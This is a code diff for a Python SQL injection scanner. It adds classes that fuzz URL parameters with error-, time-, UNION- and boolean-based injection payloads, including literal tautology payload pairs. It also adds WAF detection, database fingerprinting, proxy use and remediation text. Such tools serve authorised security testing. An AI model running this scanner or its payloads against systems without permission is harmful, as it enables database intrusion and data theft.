+    def test_error_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
+        """Test for error-based SQL injection"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if not params:
+            return None
+        
+        # Get baseline response
+        baseline = self.make_request(url)
+        if not baseline:
+            return None
+        
+        # Check for WAF
+        waf = self.detect_waf(url, baseline.headers, baseline.text)
+        
+        # Test each parameter
+        for param_name, param_values in params.items():
+            for payload in payloads:
+                # Create fuzzed URL
+                fuzzed_params = params.copy()
+                fuzzed_params[param_name] = [param_values[0] + payload]
+                
+                new_query = urlencode(fuzzed_params, doseq=True)
+                fuzzed_url = urlunparse(parsed._replace(query=new_query))
+                
+                # Make request
+                response = self.make_request(fuzzed_url)
+                if not response:
                     continue
                 
-                if line not in payloads[current_category]:
-                    payloads[current_category].append(line)
+                # Check for errors
+                has_error, patterns, db_type = self.check_error_signatures(response.text)
+                
+                if has_error:
+                    return VulnerabilityResult(
+                        url=url,
+                        severity=VulnerabilityLevel.CRITICAL,
+                        confidence=0.95,
+                        vulnerability_type='Error-Based SQL Injection',
+                        affected_parameter=param_name,
+                        payload_used=payload,
+                        evidence=f"Found {len(patterns)} error patterns",
+                        database_type=db_type,
+                        waf_detected=waf,
+                        status_code=response.status_code,
+                        remediation=self._get_remediation('error_based')
+                    )
         
-        total = sum(len(v) for v in payloads.values())
-        console.print(f"[green]✓[/green] Loaded {total} payloads from {filepath}")
-        return payloads
+        return None
+    
+    def test_time_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
+        """Test for time-based blind SQL injection"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
         
-    except Exception as e:
-        console.print(f"[red]✗[/red] Error loading payloads: {str(e)}")
-        return payloads
-
-# -------------------------------------------------------------------------
-# MODERN UI FUNCTIONS
-# -------------------------------------------------------------------------
-
-def print_banner():
-    """Display modern cyberpunk banner with Rich"""
-    banner_content = Text()
-    
-    # Futuristic Glitchy Title
-    banner_content.append("───[ ", style="bright_black")
-    banner_content.append("VIP_SQLI_SCANNER_v2.2", style="bold cyan")
-    banner_content.append(" ]───", style="bright_black")
-    banner_content.append("\n\n")
-    
-    banner_content.append(">> SYSTEM_READY: ", style="dim white")
-    banner_content.append("OPERATIONAL", style="bold green")
-    banner_content.append("\n")
-    banner_content.append(">> PROTOCOL: ", style="dim white")
-    banner_content.append("CYBER_TRIAGE", style="bold magenta")
-    banner_content.append("\n\n")
-    
-    banner_content.append("[", style="dim")
-    banner_content.append(" ML_DETECTOR ", style="bold cyan")
-    banner_content.append("][", style="dim")
-    banner_content.append(" PLUGIN_SYST ", style="bold magenta")
-    banner_content.append("][", style="dim")
-    banner_content.append(" LIVE_DASH ", style="bold yellow")
-    banner_content.append("]", style="dim")
-    banner_content.append("\n\n")
-    
-    banner_content.append("NET_LINK: ", style="dim")
-    banner_content.append(GITHUB_URL, style="blue underline")
-    banner_content.append("\n")
-    
-    # Status Indicators
-    from pathlib import Path
-    ml_status = "ACTIVE" if Path("ml/models/default.pkl").exists() else "OFFLINE"
-    ml_color = "bold green" if ml_status == "ACTIVE" else "bold red"
-    
-    banner_content.append(">> ML_ENGINE: ", style="dim white")
-    banner_content.append(ml_status, style=ml_color)
-    
-    panel = Panel(
-        banner_content,
-        box=box.ASCII2,
-        border_style="magenta",
-        padding=(1, 4),
-        subtitle="[dim]EST 2026.viphacker100[/dim]"
-    )
-    console.print(panel)
-    console.print()
-
-def create_stats_panel():
-    """Create cyberpunk live stats panel"""
-    elapsed = int(stats.elapsed())
-    rps = stats.requests_per_second()
-    
-    stats_table = Table(show_header=False, box=None, padding=(0, 2))
-    stats_table.add_column(style="magenta")
-    stats_table.add_column(style="bold white")
-    
-    stats_table.add_row("NETWORK_TOTAL:", f"[bold cyan]{stats.total}[/bold cyan]")
-    stats_table.add_row("BYPASSED_WAF:", f"[bold yellow]{stats.waf_detected}[/bold yellow]")
-    stats_table.add_row("VULNERABILITIES:", f"[bold magenta]CRITICAL_{stats.vulnerable}[/bold magenta]")
-    stats_table.add_row("CLEAN_NODES:", f"[bold green]{stats.safe}[/bold green]")
-    stats_table.add_row("PACKET_ERRORS:", f"[bold red]{stats.errors}[/bold red]")
-    stats_table.add_row("TIME_ELAPSED:", f"[white]{elapsed}s[/white]")
-    stats_table.add_row("FREQ_HZ:", f"[blue]{rps} rps[/blue]")
-    
-    return Panel(stats_table, title="[bold magenta]SYS_METRICS[/bold magenta]", border_style="cyan", box=box.SQUARE)
-
-def display_result_table(results):
-    """Display results in a beautiful table"""
-    table = Table(title="Scan Results", box=box.ROUNDED, show_lines=True)
-    
-    table.add_column("URL", style="cyan", no_wrap=False)
-    table.add_column("Status", justify="center")
-    table.add_column("Risk", justify="center")
-    table.add_column("Details", style="dim")
-    
-    for result in results:
-        url = result['url']
-        verdict = result['verdict']
-        risk = result.get('risk', 'N/A')
-        details = result.get('details', '')
+        if not params:
+            return None
         
-        if verdict == "CRITICAL":
-            status_style = "[bold red]VULNERABLE[/bold red]"
-            risk_style = f"[bold red]{risk}[/bold red]"
-        elif verdict == "WARN":
-            status_style = "[yellow]INVESTIGATE[/yellow]"
-            risk_style = f"[yellow]{risk}[/yellow]"
-        else:
-            status_style = "[green]SAFE[/green]"
-            risk_style = f"[green]{risk}[/green]"
+        # Get baseline response time
+        baseline_times = []
+        for _ in range(3):
+            start = time.time()
+            response = self.make_request(url)
+            if response:
+                baseline_times.append(time.time() - start)
         
-        table.add_row(url, status_style, risk_style, details)
-    
-    console.print(table)
-
-# -------------------------------------------------------------------------
-# DETECTION LOGIC
-# -------------------------------------------------------------------------
-
-def detect_waf(url: str, headers: dict, content: str) -> Optional[str]:
-    """Detect Web Application Firewall"""
-    detected_waf = None
-    for waf_name, signatures in WAF_SIGNATURES.items():
-        for sig in signatures:
-            for header_name, header_value in headers.items():
-                if sig.lower() in header_name.lower() or sig.lower() in str(header_value).lower():
-                    detected_waf = waf_name
-                    break
-            if sig.lower() in content.lower():
-                detected_waf = waf_name
-                break
-        if detected_waf: break
-    return detected_waf
-
-def fingerprint_database(content: str, errors: List[str]) -> Optional[str]:
-    """Fingerprint database type from error messages"""
-    content_lower = content.lower()
-    errors_lower = ' '.join(errors).lower()
-    combined = content_lower + ' ' + errors_lower
-    for db_type, signatures in DB_FINGERPRINTS.items():
-        for sig in signatures:
-            if sig.lower() in combined:
-                return db_type
-    return None
-
-# -------------------------------------------------------------------------
-# SCANNING LOGIC
-# -------------------------------------------------------------------------
-
-
-# -------------------------------------------------------------------------
-# SCANNING LOGIC
-# -------------------------------------------------------------------------
-
-def check_ml_and_plugins(url, response, ml_detector=None, plugin_manager=None, result=None):
-    """Helper to run ML and Plugin checks"""
-    if not result: result = {}
-    
-    # ML Check
-    if ml_detector and response:
-        try:
-            # Reconstruct features (requires ml.features import)
-            from ml.features import FeatureExtractor
-            extractor = FeatureExtractor()
-            # Simple error check for features
-            errors = []
-            for sig in ERROR_SIGNATURES:
-                if sig in response.text: errors.append(sig)
-            
-            features = extractor.combine_features(
-                url, response, {'errors': errors, 'waf': False}
-            )
-            is_vuln_ml, confidence = ml_detector.predict(features)
-            result['ml_confidence'] = float(confidence)
-            if is_vuln_ml and confidence > 0.80 and result.get('verdict') != 'CRITICAL':
-                result['verdict'] = 'WARN'
-                result['details'] = f"ML Suspicion ({confidence:.2f})"
-        except Exception as e:
-            pass
-
-    # Plugin Check
-    if plugin_manager:
-        try:
-            p_results = plugin_manager.run_plugins(url, response)
-            for name, res in p_results.items():
-                if res.get('vulnerable'):
-                    result['verdict'] = 'CRITICAL'
-                    result['details'] = f"Plugin {name}: {res.get('details')}"
-                    result['risk'] = 'Critical'
-                    result['vuln_details'] = res.get('details')
-        except Exception:
-            pass
-            
-    # Broadcast
-    try:
-        from dashboard import broadcast_update
-        broadcast_update(result)
-    except:
-        pass
-
-def rule_zero_static_check(url):
-    """Rule #0: Static file != SQLi"""
-    parsed = urlparse(url)
-    path = parsed.path.lower()
-    if path.endswith(STATIC_EXTENSIONS):
-        return False, f"Static file extension detected ({path.split('.')[-1]})"
-    return True, "Passed"
-
-def step_one_file_type(url):
-    """Step 1: File type check"""
-    parsed = urlparse(url)
-    path = parsed.path.lower()
-    for imp_path in IMPOSSIBLE_PATHS:
-        if imp_path in path:
-            return False, f"Path is in safe directory: {imp_path}"
-    if path.endswith(POSSIBLE_SQLI_EXTENSIONS):
-        return True, f"High risk extension detected ({path.split('.')[-1]})"
-    return True, "Standard endpoint (proceeding)"
-
-def step_two_param_check(url):
-    """Step 2: Parameter name check"""
-    parsed = urlparse(url)
-    query_params = parse_qs(parsed.query)
-    if not query_params:
-        return False, "No parameters found in URL"
+        if not baseline_times:
+            return None
         
-    high_risk_found = []
-    low_risk_found = []
-    
-    for param in query_params.keys():
-        param_lower = param.lower()
-        if param_lower in HIGH_RISK_PARAMS:
-            high_risk_found.append(param)
-        elif param_lower in LOW_RISK_PARAMS or param_lower.startswith('utm_'):
-            low_risk_found.append(param)
-            
-    if low_risk_found and not high_risk_found:
-        return "LOW", f"Mostly low risk params: {low_risk_found}"
-    if high_risk_found:
-        return "HIGH", f"High risk parameters found: {high_risk_found}"
-    return "NEUTRAL", f"Parameters found: {list(query_params.keys())}"
-
-def check_error_signatures(content):
-    """Check for SQL error signatures"""
-    found = []
-    for sig in ERROR_SIGNATURES:
-        if sig.lower() in content.lower():
-            found.append(sig)
-    return found
-
-def test_time_based_sqli(url, session, timeout=10, payloads=None, req_manager=None):
-    """Test for time-based blind SQLi"""
-    if payloads is None:
-        payloads = PAYLOAD_CATEGORIES.get('time_based', [])[:3]
-    
-    parsed = urlparse(url)
-    query_params = parse_qs(parsed.query)
-    if not query_params:
-        return False, []
-    
-    vulnerable_params = []
-    for param in query_params.keys():
-        if param.lower() not in HIGH_RISK_PARAMS:
-            continue
-            
-        for payload in payloads:
-            fuzzed_params = query_params.copy()
-            fuzzed_params[param] = [payload]
-            new_query = urlencode(fuzzed_params, doseq=True)
-            fuzzed_url = urlunparse(parsed._replace(query=new_query))
-            
-            try:
-                proxies = {'http': req_manager.get_proxy(), 'https': req_manager.get_proxy()} if req_manager else None
+        avg_baseline = sum(baseline_times) / len(baseline_times)
+        threshold = avg_baseline + (self.config.time_based_delay * 0.8)
+        
+        # Test each parameter
+        for param_name, param_values in params.items():
+            for payload in payloads:
+                # Create fuzzed URL
+                fuzzed_params = params.copy()
+                fuzzed_params[param_name] = [param_values[0] + payload]
+                
+                new_query = urlencode(fuzzed_params, doseq=True)
+                fuzzed_url = urlunparse(parsed._replace(query=new_query))
+                
+                # Make request and measure time
                 start = time.time()
-                resp = session.get(fuzzed_url, timeout=timeout, proxies=proxies)
+                response = self.make_request(fuzzed_url)
                 elapsed = time.time() - start
                 
-                if elapsed >= 4:
-                    vulnerable_params.append({
-                        'param': param,
-                        'payload': payload,
-                        'delay': f"{elapsed:.2f}s"
-                    })
-                    return True, vulnerable_params
-            except:
-                pass
-    return False, vulnerable_params
-
-def step_three_four_behavior_error(url, enable_time_based=False, payloads=None, req_manager=None):
-    """Step 3 & 4: Behavior test & Error signature"""
-    parsed = urlparse(url)
-    query_params = parse_qs(parsed.query)
-    if not query_params:
-        return "SKIP", "No params to fuzz", {}
-    
-    target_params = [p for p in query_params.keys() if p.lower() in HIGH_RISK_PARAMS]
-    if not target_params:
-        target_params = list(query_params.keys())
+                if not response:
+                    continue
+                
+                # Check if response was delayed
+                if elapsed >= threshold:
+                    # Verify with second request
+                    start2 = time.time()
+                    response2 = self.make_request(fuzzed_url)
+                    elapsed2 = time.time() - start2
+                    
+                    if response2 and elapsed2 >= threshold:
+                        return VulnerabilityResult(
+                            url=url,
+                            severity=VulnerabilityLevel.CRITICAL,
+                            confidence=0.90,
+                            vulnerability_type='Time-Based Blind SQL Injection',
+                            affected_parameter=param_name,
+                            payload_used=payload,
+                            evidence=f"Response delayed: {elapsed:.2f}s (baseline: {avg_baseline:.2f}s)",
+                            response_time=elapsed,
+                            status_code=response.status_code,
+                            remediation=self._get_remediation('time_based')
+                        )
         
-    session = requests.Session()
-    # Apply custom headers
-    if req_manager:
-        session.headers.update(req_manager.get_headers())
-    else:
-        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-
-    try:
-        proxies = {'http': req_manager.get_proxy(), 'https': req_manager.get_proxy()} if req_manager else None
-        baseline = session.get(url, timeout=10, proxies=proxies)
-    except Exception as e:
-        return "ERROR", f"Failed to connect: {str(e)}", {}
-
-    # WAF & Error Detection in Baseline
-    waf_detected = detect_waf(url, baseline.headers, baseline.text)
-    if waf_detected:
-        stats.waf_detected += 1
-
-    baseline_errors = check_error_signatures(baseline.text)
-    if baseline_errors:
-        db_type = fingerprint_database(baseline.text, baseline_errors)
-        result_details = {'type': 'error-based', 'errors': baseline_errors}
-        if db_type:
-            result_details['database'] = db_type
-            stats.db_types_detected[db_type] = stats.db_types_detected.get(db_type, 0) + 1
-        if waf_detected:
-            result_details['waf'] = waf_detected
-        return "CRITICAL", "SQL Error present in baseline request!", result_details
-
-    # Time-based blind SQLi test
-    if enable_time_based:
-        is_vuln, time_results = test_time_based_sqli(url, session, payloads=payloads, req_manager=req_manager)
-        if is_vuln:
-            result_details = {'type': 'time-based', 'results': time_results}
-            if waf_detected:
-                result_details['waf'] = waf_detected
-            return "CRITICAL", f"Time-based blind SQLi detected", result_details
-
-    # Standard fuzzing
-    real_sqli_candidate = False
-    error_details = {}
+        return None
     
-    for param in target_params:
-        fuzzed_params = query_params.copy()
-        fuzzed_params[param] = ['99999999']
-        new_query = urlencode(fuzzed_params, doseq=True)
-        fuzzed_url = urlunparse(parsed._replace(query=new_query))
+    def test_union_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
+        """Test for UNION-based SQL injection"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if not params:
+            return None
+        
+        # Get baseline
+        baseline = self.make_request(url)
+        if not baseline:
+            return None
+        
+        baseline_length = len(baseline.text)
+        
+        # Test each parameter
+        for param_name, param_values in params.items():
+            for payload in payloads:
+                fuzzed_params = params.copy()
+                fuzzed_params[param_name] = [param_values[0] + payload]
+                
+                new_query = urlencode(fuzzed_params, doseq=True)
+                fuzzed_url = urlunparse(parsed._replace(query=new_query))
+                
+                response = self.make_request(fuzzed_url)
+                if not response:
+                    continue
+                
+                # Check for significant content difference
+                length_diff = abs(len(response.text) - baseline_length)
+                
+                # Check for UNION success indicators
+                if length_diff > 100 or 'NULL' in response.text:
+                    # Also check for errors (might reveal column count)
+                    has_error, patterns, db_type = self.check_error_signatures(response.text)
+                    
+                    if has_error or length_diff > 500:
+                        return VulnerabilityResult(
+                            url=url,
+                            severity=VulnerabilityLevel.HIGH,
+                            confidence=0.75,
+                            vulnerability_type='UNION-Based SQL Injection',
+                            affected_parameter=param_name,
+                            payload_used=payload,
+                            evidence=f"Response length changed by {length_diff} bytes",
+                            database_type=db_type,
+                            status_code=response.status_code,
+                            remediation=self._get_remediation('union_based')
+                        )
+        
+        return None
+
+    def test_boolean_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
+        """Test for boolean-based blind SQL injection"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if not params:
+            return None
+            
+        # Get baseline
+        baseline = self.make_request(url)
+        if not baseline:
+            return None
+            
+        baseline_len = len(baseline.text)
+        
+        # Test each parameter
+        for param_name, param_values in params.items():
+            # Boolean test pairs (TRUE, FALSE)
+            test_pairs = [
+                ("' AND '1'='1", "' AND '1'='2"),
+                ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
+                ("') AND ('1'='1", "') AND ('1'='2"),
+                ("\")) AND ((\"1\"=\"1", "\")) AND ((\"1\"=\"2"),
+                (" AND 1=1", " AND 1=2")
+            ]
+            
+            for true_payload, false_payload in test_pairs:
+                # Test TRUE condition
+                fuzzed_params_true = params.copy()
+                fuzzed_params_true[param_name] = [param_values[0] + true_payload]
+                true_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params_true, doseq=True)))
+                
+                resp_true = self.make_request(true_url)
+                if not resp_true:
+                    continue
+                
+                # Test FALSE condition
+                fuzzed_params_false = params.copy()
+                fuzzed_params_false[param_name] = [param_values[0] + false_payload]
+                false_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params_false, doseq=True)))
+                
+                resp_false = self.make_request(false_url)
+                if not resp_false:
+                    continue
+                
+                # Analyze diffs
+                true_diff = abs(len(resp_true.text) - baseline_len)
+                false_diff = abs(len(resp_false.text) - baseline_len)
+                
+                # If TRUE is close to baseline but FALSE is different
+                if true_diff < 50 and false_diff > 100:
+                    return VulnerabilityResult(
+                        url=url,
+                        severity=VulnerabilityLevel.HIGH,
+                        confidence=0.85,
+                        vulnerability_type='Boolean-Based Blind SQL Injection',
+                        affected_parameter=param_name,
+                        payload_used=f"{true_payload} / {false_payload}",
+                        evidence=f"Baseline: {baseline_len}, TRUE: {len(resp_true.text)}, FALSE: {len(resp_false.text)}",
+                        status_code=resp_true.status_code,
+                        remediation=self._get_remediation('boolean_based')
+                    )
+        return None
+
+    def _get_remediation(self, vuln_type: str) -> str:
+        """Get remediation guidance"""
+        remediations = {
+            'error_based': """
+**Remediation Steps:**
+1. Use parameterized queries (prepared statements) exclusively
+2. Disable detailed error messages in production
+3. Implement input validation and sanitization
+4. Apply principle of least privilege to database users
+5. Use Web Application Firewall (WAF) rules
+6. Regular security testing and code reviews
+""",
+            'time_based': """
+**Remediation Steps:**
+1. Use parameterized queries (prepared statements)
+2. Implement query timeout limits
+3. Monitor and log unusual response times
+4. Use input validation with whitelist approach
+5. Disable or restrict time-delay functions in database
+6. Apply rate limiting on sensitive endpoints
+""",
+            'union_based': """
+**Remediation Steps:**
+1. Use parameterized queries (prepared statements)
+2. Validate and sanitize all user inputs
+3. Implement strict output encoding
+4. Use allowlist validation for query parameters
+5. Restrict database permissions
+6. Regular penetration testing
+""",
+            'boolean_based': """
+**Remediation Steps:**
+1. Use parameterized queries (prepared statements)
+2. Implement robust input validation (type checking, length limits)
+3. Ensure consistent response times and content regardless of query results
+4. Avoid using raw inputs in WHERE clauses
+5. Monitor for repeated TRUE/FALSE condition testing patterns
+6. Use a Web Application Firewall (WAF) to block boolean-based payloads
+"""
+        }
+        return remediations.get(vuln_type, "Use parameterized queries and input validation.")
+
+# =========================================================================
+# URL FILTER
+# =========================================================================
+
+class URLFilter:
+    """Filters and validates URLs for scanning"""
+    
+    def __init__(self, exclusions: List[str] = None):
+        self.exclusions = exclusions or []
+    
+    def should_scan(self, url: str) -> Tuple[bool, str]:
+        """Determine if URL should be scanned"""
+        
+        # Check for static files
+        if self._is_static_file(url):
+            return False, "Static file extension"
+        
+        # Check impossible paths
+        if self._is_impossible_path(url):
+            return False, "Safe directory path"
+        
+        # Check exclusions
+        for exclusion in self.exclusions:
+            if exclusion in url:
+                return False, f"Excluded by pattern: {exclusion}"
+        
+        # Check for parameters
+        parsed = urlparse(url)
+        if not parsed.query:
+            return False, "No query parameters"
+        
+        return True, "Passed filters"
+    
+    def _is_static_file(self, url: str) -> bool:
+        """Check if URL points to static file"""
+        parsed = urlparse(url)
+        path = parsed.path.lower()
+        return path.endswith(STATIC_EXTENSIONS)
+    
+    def _is_impossible_path(self, url: str) -> bool:
+        """Check if URL is in safe directory"""
+        parsed = urlparse(url)
+        path = parsed.path.lower()
+        return any(imp_path in path for imp_path in IMPOSSIBLE_PATHS)
+    
+    def get_param_risk_score(self, url: str) -> Tuple[int, List[str]]:
+        """Calculate risk score based on parameters"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if not params:
+            return 0, []
+        
+        high_risk = []
+        low_risk = []
+        
+        for param in params.keys():
+            param_lower = param.lower()
+            if param_lower in HIGH_RISK_PARAMS:
+                high_risk.append(param)
+            elif param_lower in LOW_RISK_PARAMS:
+                low_risk.append(param)
+        
+        # Calculate score: high risk params add 10 points each
+        score = len(high_risk) * 10 + len(params)
+        
+        return score, high_risk
+
+# =========================================================================
+# SCANNER ENGINE
+# =========================================================================
+
+class SQLiScanner:
+    """Main SQL injection scanner"""
+    
+    def __init__(self, config: ScanConfiguration, payload_manager: PayloadManager,
+                 url_filter: URLFilter, statistics: ScanStatistics):
+        self.config = config
+        self.payload_manager = payload_manager
+        self.url_filter = url_filter
+        self.stats = statistics
+        self.detection_engine = DetectionEngine(config)
+        self.results: List[VulnerabilityResult] = []
+        self._cache = {}
+        
+        # Initialize advanced components
+        self.ml_detector = MLDetector() if config.enable_ml and MLDetector else None
+        self.plugin_manager = PluginManager(asdict(config)) if config.enable_plugins and PluginManager else None
+        if self.plugin_manager:
+            try:
+                self.plugin_manager.load_all_plugins()
+            except Exception as e:
+                console.print(f"[yellow]Warning: Failed to load plugins: {e}[/yellow]")
+        
+        self.cloud_manager = CloudManager(asdict(config)) if config.cloud_sync and CloudManager else None
+    
+    def scan_url(self, url: str) -> Optional[VulnerabilityResult]:
+        """Scan a single URL"""
+        
+        # Check cache
+        url_hash = hashlib.md5(url.encode()).hexdigest()
+        if url_hash in self._cache:
+            return self._cache[url_hash]
+        
+        # Filter URL
+        should_scan, reason = self.url_filter.should_scan(url)
+        if not should_scan:
+            self.stats.excluded_urls += 1
+            return None
+        
+        result = None
         
         try:
-            proxies = {'http': req_manager.get_proxy(), 'https': req_manager.get_proxy()} if req_manager else None
-            resp = session.get(fuzzed_url, timeout=10, proxies=proxies)
-            errors = check_error_signatures(resp.text)
-            if errors:
-                real_sqli_candidate = True
-                db_type = fingerprint_database(resp.text, errors)
-                error_details = {'type': 'error-based', 'param': param, 'errors': errors}
-                if db_type:
-                    error_details['database'] = db_type
-                    stats.db_types_detected[db_type] = stats.db_types_detected.get(db_type, 0) + 1
-                if waf_detected:
-                    error_details['waf'] = waf_detected
-                break
-        except:
-            pass
+            # Test error-based
+            if self.config.enable_error:
+                payloads = self.payload_manager.get_payloads('error_based', limit=15)
+                result = self.detection_engine.test_error_based(url, payloads)
+                if result:
+                    self.stats.error_based += 1
+            
+            # Test time-based
+            if not result and self.config.enable_time_based:
+                payloads = self.payload_manager.get_payloads('time_based', limit=10)
+                result = self.detection_engine.test_time_based(url, payloads)
+                if result:
+                    self.stats.time_based += 1
+            
+            # Test union-based
+            if not result and self.config.enable_union:
+                payloads = self.payload_manager.get_payloads('union_based', limit=10)
+                result = self.detection_engine.test_union_based(url, payloads)
+                if result:
+                    self.stats.union_based += 1
+            
+            # Test boolean-based
+            if not result and self.config.enable_boolean:
+                payloads = self.payload_manager.get_payloads('boolean_based', limit=10)
+                result = self.detection_engine.test_boolean_based(url, payloads)
+                if result:
+                    self.stats.boolean_based += 1
+            
+            # Run Plugins if no result yet
+            if not result and self.plugin_manager:
+                try:
+                    plugin_results = self.plugin_manager.run_plugins(url, None)
+                    for name, p_result in plugin_results.items():
+                        if p_result.get('vulnerable'):
+                            result = VulnerabilityResult(
+                                url=url,
+                                severity=VulnerabilityLevel.HIGH,
+                                confidence=0.7,
+                                vulnerability_type=f"Plugin: {name}",
+                                affected_parameter="Multiple/Unknown",
+                                payload_used="Plugin Specific",
+                                evidence=str(p_result.get('details', '')),
+                                remediation=self.detection_engine._get_remediation('error_based')
+                            )
+                            break
+                except Exception as e:
+                    console.print(f"[yellow]Warning: Plugin execution failed for {url}: {e}[/yellow]")
 
-    if real_sqli_candidate:
-        return "CRITICAL", "SQL Injection Candidate Found (error signatures)", error_details
+            # Optional ML Scoring for suspicious results or as a side-check
+            if self.ml_detector:
+                # Placeholder for ML feature extraction and scoring
+                pass
+            
+            # Update statistics
+            if result:
+                self.stats.vulnerable_urls += 1
+                if result.database_type:
+                    self.stats.db_types[result.database_type] += 1
+                if result.waf_detected:
+                    self.stats.waf_detected_count += 1
+                    self.stats.waf_types[result.waf_detected or "Unknown"] += 1
+                
+                # Cloud Sync if enabled
+                if self.cloud_manager:
+                    try:
+                        self.cloud_manager.sync_finding(result.to_dict())
+                    except Exception:
+                        pass
+            else:
+                self.stats.safe_urls += 1
+            
+            self.stats.scanned_urls += 1
+            
+        except Exception as e:
+            self.stats.error_count += 1
+            console.print(f"[red]Error scanning {url}: {str(e)}[/red]")
+        
+        # Cache result
+        self._cache[url_hash] = result
+        
+        return result
     
-    return "SAFE", "No obvious SQLi behavior detected", {}
-
-# -------------------------------------------------------------------------
-# ASYNC SCANNING
-# -------------------------------------------------------------------------
-
-async def async_scan_single_url(session: aiohttp.ClientSession, url: str, 
-                                enable_time_based: bool = False, 
-                                payloads: Dict = None,
-                                semaphore: asyncio.Semaphore = None,
-                                req_manager: RequestManager = None) -> Dict:
-    if semaphore:
-        async with semaphore:
-            return await _async_scan_url_impl(session, url, enable_time_based, payloads, req_manager)
-    else:
-        return await _async_scan_url_impl(session, url, enable_time_based, payloads, req_manager)
-
-async def _async_scan_url_impl(session: aiohttp.ClientSession, url: str,
-                                enable_time_based: bool, payloads: Dict, 
-                                req_manager: RequestManager = None) -> Dict:
-    # Use thread pool to run synchronous detection logic (reusing implementation)
-    loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(None, scan_single_url, url, enable_time_based, False, payloads, req_manager)
-    return result
-
-async def scan_urls_async(urls, exclusions=[], max_concurrent=20, enable_time_based=False,
-                          payloads=None, verbose=False, req_manager=None, resume_state=None):
-    results = resume_state[1] if resume_state else []
-    processed_urls = resume_state[0] if resume_state else set()
-    
-    urls_to_scan = []
-    for url in urls:
-        if url in processed_urls: continue
-        excluded = False
-        for pattern in exclusions:
-            if pattern in url:
-                stats.excluded += 1
-                excluded = True
-                break
-        if not excluded:
-            urls_to_scan.append(url)
-    
-    semaphore = asyncio.Semaphore(max_concurrent)
-    connector = aiohttp.TCPConnector(limit=max_concurrent)
-    timeout = aiohttp.ClientTimeout(total=30)
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        tasks = []
-        for url in urls_to_scan:
-            tasks.append(async_scan_single_url(session, url, enable_time_based, payloads, semaphore, req_manager))
+    def scan_urls(self, urls: List[str]) -> List[VulnerabilityResult]:
+        """Scan multiple URLs with threading"""
         
         with Progress(
             SpinnerColumn(),
@@ -804,527 +1176,651 @@ async def scan_urls_async(urls, exclusions=[], max_concurrent=20, enable_time_ba
             BarColumn(),
             TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
             TimeElapsedColumn(),
+            TextColumn("• {task.fields[status]}"),
             console=console
         ) as progress:
-            task = progress.add_task("[cyan]Scanning URLs (Async)...", total=len(tasks))
             
-            # Process in chunks to save state periodically
-            chunk_size = 50
-            completed_count = 0
+            task = progress.add_task(
+                "[cyan]Scanning URLs...",
+                total=len(urls),
+                status="Initializing..."
+            )
             
-            for i in range(0, len(tasks), chunk_size):
-                chunk = tasks[i:i + chunk_size]
-                if not chunk: break
+            with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
+                future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
                 
-                for coro in asyncio.as_completed(chunk):
+                for future in as_completed(future_to_url):
+                    url = future_to_url[future]
                     try:
-                        result = await coro
-                        results.append(result)
-                        processed_urls.add(result['url'])
-                        stats.scanned += 1
+                        result = future.result()
+                        if result:
+                            self.results.append(result)
+                            progress.update(task, status=f"[red]VULN: {url[:50]}[/red]")
+                        else:
+                            progress.update(task, status=f"[green]SAFE: {url[:50]}[/green]")
                     except Exception as e:
-                        stats.errors += 1
-                        console.print(f"[red]Error:[/red] {str(e)}")
+                        console.print(f"[red]Error: {str(e)}[/red]")
+                    
                     progress.advance(task)
-                    completed_count += 1
-                
-                # Auto-save state
-                save_state(processed_urls, results)
-    
-    return results
-
-# -------------------------------------------------------------------------
-# THREADED SCANNING
-# -------------------------------------------------------------------------
-
-def scan_single_url(url, enable_time_based=False, verbose=False, payloads=None, req_manager=None):
-    result = {
-        'url': url,
-        'verdict': 'SAFE',
-        'risk': 'Low',
-        'details': '',
-        'timestamp': datetime.now().isoformat()
-    }
-    
-    should_proceed, msg = rule_zero_static_check(url)
-    if not should_proceed:
-        result['details'] = msg
-        stats.safe += 1
-        return result
-    
-    should_proceed, msg = step_one_file_type(url)
-    if not should_proceed:
-        result['details'] = msg
-        stats.safe += 1
-        return result
-    
-    risk_level, msg = step_two_param_check(url)
-    if risk_level == False:
-        result['details'] = "No parameters"
-        stats.safe += 1
-        return result
-    
-    verdict, msg, details = step_three_four_behavior_error(url, enable_time_based, payloads, req_manager)
-    
-    result['verdict'] = verdict
-    result['details'] = msg
-    
-    # v2.2 Helper Call
-    # Note: We don't have the response object here easily from step_three
-    # But we can at least broadcast the result to dashboard
-    check_ml_and_plugins(url, None, ml_detector, plugin_manager, result)
-    
-    try:
-        from dashboard import broadcast_update
-        broadcast_update(result)
-    except:
-        pass
-
-    # Calculate Risk & CVSS
-    if verdict == "CRITICAL":
-        result['risk'] = 'Critical'
-        result['cvss_score'] = CVSS_SCORES['CRITICAL']
-        result['cvss_vector'] = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
-        stats.vulnerable += 1
         
-        # Determine specific remediation
-        vuln_type = 'general'
-        if details and 'type' in details:
-            vuln_type = details['type']
-        elif details and isinstance(details, dict) and 'errors' in details:
-             vuln_type = 'error-based'
+        self.stats.end_time = time.time()
+        return self.results
+
+# =========================================================================
+# REPORTING
+# =========================================================================
+
+class ReportGenerator:
+    """Generate scan reports"""
+    
+    def __init__(self, statistics: ScanStatistics, results: List[VulnerabilityResult]):
+        self.stats = statistics
+        self.results = results
+    
+    def generate_console_report(self):
+        """Generate console report"""
         
-        result['remediation'] = REMEDIATION_GUIDE.get(vuln_type, REMEDIATION_GUIDE['general'])
+        # Statistics panel
